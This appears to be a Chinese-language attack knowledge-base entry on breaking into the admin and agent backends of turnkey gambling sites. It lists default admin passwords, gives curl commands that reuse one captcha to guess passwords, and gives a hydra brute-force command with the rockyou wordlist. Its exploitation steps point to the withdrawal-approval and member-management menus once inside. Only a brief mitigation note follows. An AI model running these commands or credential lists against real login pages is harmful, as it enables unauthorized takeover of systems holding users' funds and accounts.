---
title: 运营后台弱口令 + 验证码复用（博彩站点最常见入口）
cve: 无（业务逻辑）
severity: critical
cvss: 9.1
product: 自研运营/代理后台（包网系统）
versions: 任意
ports: 80, 443, 8080, 8443
keywords: 弱口令, 后台, 验证码复用, 运营商, 包网, 登录
entry: /admin /manage /agent 的登录接口
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
/admin  /manage  /operator  /agent  /backend
POST /api/admin/login  {"username":"admin","password":"...","captcha":"..."}
```

包网系统后台常见默认：`admin/admin`、`admin/123456`、`admin888`、`operator/operator`、`test/test123`；验证码常**校验后不失效**。

## 前置条件

- 后台入口暴露（不限于内网）；
- 有可复用的验证码接口（`/api/captcha`）。

## PoC

```bash
# 1) 拿一次验证码（记下 cookie 与 code 的对应关系）
curl -s -c /tmp/c.txt 'https://target/api/captcha' -o /tmp/cap.json && cat /tmp/cap.json

# 2) 用同一 code 连续试口令：不换 code 就能一直试 = 复用漏洞
for p in admin admin123 123456 admin888 operator888; do
  curl -s -b /tmp/c.txt -X POST 'https://target/api/admin/login' \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"admin\",\"password\":\"$p\",\"captcha\":\"<同一code>\"}" \
    -o /dev/null -w "$p %{http_code}\n"
done
# 判定：多次请求都返回 200/{"code":0} 系列（不是验证码错误）= 复用成立
```

```bash
# 3) 爆破（限速，20 次/分钟以内）
hydra -l admin -P /usr/share/wordlists/rockyou.txt target https-post-form \
  "/api/admin/login:username=^USER^&password=^PASS^&captcha=8888:F=验证码错误"
```

## 利用步骤

1. 先确认验证码是否失效（第 2 步）；
2. 有复用就小字典试（10~20 个常见口令足够）；
3. 进后台先看"提现审核""会员管理"两个菜单，确认权限层级；
4. 证据：一次成功登录的请求+响应（脱敏 cookie）。

## 修复与缓解

- 验证码一次性 + 5 分钟过期；登录失败计数按账号+IP；后台限 IP 白名单。
- 强制管理员口令强度 + 2FA。

## 参考

- OWASP WSTG-ATHN-01；常见包网后台口令样本。
